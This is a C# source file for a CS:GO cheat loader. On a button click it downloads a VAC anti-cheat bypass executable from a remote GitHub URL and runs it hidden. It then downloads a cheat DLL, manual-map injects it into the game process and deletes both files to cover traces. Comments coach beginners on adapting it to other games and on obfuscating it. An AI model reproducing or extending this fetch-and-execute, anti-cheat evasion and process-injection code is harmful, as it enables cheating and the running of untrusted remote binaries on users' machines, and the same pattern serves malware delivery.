﻿//SimpleLoader by Wilson, https://github.com/WilsonPublic/SimpleLoader [Open Source Cheat Loader]
//This is very noob friendly and can easily be adapted, this has no form of protection against cracking so please come up with your own ideas on how to prevent cracking
//I recommend using Dot Net Reactor to protect your programs

using System;
using System.Linq;
using System.Windows.Forms;
using ManualMapInjection.Injection;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace WindowsFormsApp2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private async void button2_Click_1(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string vacpath = "C:\\VAC-Bypass.exe"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
            wb.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/VAC-Bypass-Loader.exe", vacpath);
            ProcessStartInfo start = new ProcessStartInfo(); //execute it
            start.FileName = "C:\\VAC-Bypass.exe";
            start.WindowStyle = ProcessWindowStyle.Hidden; //Do you want to show a console window?
            start.CreateNoWindow = false;
            int exitCode;
            using (Process proc = Process.Start(start)) //Run the external process & wait for it to finish
            {
                proc.WaitForExit();
                exitCode = proc.ExitCode; //Retrieve the app's exit code
                System.IO.File.Delete(vacpath); //Deleting the the vacbypass
                {
                    int time_to_wait = 5000;
                    start.FileName = "steam.exe";
                    Process.Start("steam://rungameid/730"); //launch game 730 aka csgo
                    await Task.Delay(time_to_wait);
                    Process csgo = Process.GetProcessesByName("csgo").FirstOrDefault();
                    Process[] csgo_array = Process.GetProcessesByName("csgo");
                    if (csgo_array.Length != 0)
                    {
                        WebClient dl = new WebClient();
                        string mainpath = "C:\\cheat.dll"; //You can change the path to wherever you want but just remember to use "\\" instead of just one "\"
                        dl.DownloadFile("https://github.com/doonayy/fortheboys/raw/main/miscs/otc3.dll", mainpath); //Replace "DLL URL" with the URL to directly download your DLL [Example: http://myurl.com/MYDLL.dll]
                        var name = "csgo"; //Replace "csgo" with any exe you want [Example: For Team Fortress 2 you would replace it with "hl2"]
                        var target = Process.GetProcessesByName(name).FirstOrDefault();
                        var path = mainpath;
                        var file = File.ReadAllBytes(path);

                        //Checking if the DLL isn't found
                        if (!File.Exists(path))
                        {
                            MessageBox.Show("Error: DLL not found");
                            return;
                        }

                        //Injection, just leave this alone if you are a beginner
                        var injector = new ManualMapInjector(target) { AsyncInjection = true };
                        label2.Text = $"hmodule = 0x{injector.Inject(file).ToInt64():x8}";

                        if (System.IO.File.Exists(mainpath)) //Checking if the DLL exists
                        {
                            System.IO.File.Delete(mainpath); //Deleting the DLL 
                        }  
                    }
                    else
                    {
                        MessageBox.Show("test");
                        return;
                    }
                }
            }
        }
    }
}